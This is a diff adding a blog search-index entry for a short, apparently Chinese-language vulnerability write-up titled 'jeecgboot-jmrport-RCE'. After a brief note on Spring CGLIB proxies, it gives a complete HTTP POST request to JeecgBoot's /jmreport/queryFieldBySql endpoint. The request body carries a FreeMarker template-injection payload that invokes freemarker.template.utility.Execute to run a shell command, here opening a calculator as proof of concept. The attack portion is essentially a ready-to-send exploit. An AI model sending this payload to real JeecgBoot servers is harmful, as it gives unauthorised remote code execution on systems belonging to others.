@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>“jeecgboot-jmrport-RCE”</title>
+    <link href="/2023/08/17/jeecgboot-jmrport-RCE/"/>
+    <url>/2023/08/17/jeecgboot-jmrport-RCE/</url>
+    
+    <content type="html"><![CDATA[<p>#jeecgboot-jmrport-RCE</p><p>proxy-target-class属性值决定是基于接口的还是基于类的代理被创建。首先说明下proxy-target-class&#x3D;”true”和proxy-target-class&#x3D;”false”的区别，为true则是基于类的代理将起作用（需要cglib库），为false或者省略这个属性，则标准的JDK 基于接口的代理将起作用。<img src="/./2023/08/17/jeecgboot-jmrport-RCE/1692238499744.jpg" alt="1692238499744"></p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ocaml">var1.getString(<span class="hljs-string">&quot;sql&quot;</span>);-&gt;<span class="hljs-type">CglibAopProxy</span>将<br>org.jeecg.modules.jmreport.desreport.service.a.i.parseReportSql当做<span class="hljs-keyword">method</span>-&gt;springframework ssti<br><br></code></pre></td></tr></table></figure><p><img src="/./2023/08/17/jeecgboot-jmrport-RCE/1692239554981.jpg" alt="1692239760819"></p><p><img src="/./2023/08/17/jeecgboot-jmrport-RCE/1692239760819.jpg" alt="1692242107894"></p><p>POST &#x2F;jeecg-boot&#x2F;&#x2F;jmreport&#x2F;queryFieldBySql HTTP&#x2F;1.1<br>Host: 172.16.120.125:8080<br>Cache-Control: max-age&#x3D;0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;115.0.0.0 Safari&#x2F;537.36<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba&#x3D;1691723815<br>Connection: close<br>Content-Type: application&#x2F;json<br>Content-Length: 113</p><p>{“sql”:”&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;open -a calculator.app&quot;) } }’”}</p><p><img src="/./2023/08/17/jeecgboot-jmrport-RCE/1692242107894.jpg" alt="1692242107894"></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>“TD11.x-RCE”</title>
     <link href="/2023/08/07/%E2%80%9CTD11-x-RCE%E2%80%9D/"/>
     <url>/2023/08/07/%E2%80%9CTD11-x-RCE%E2%80%9D/</url>
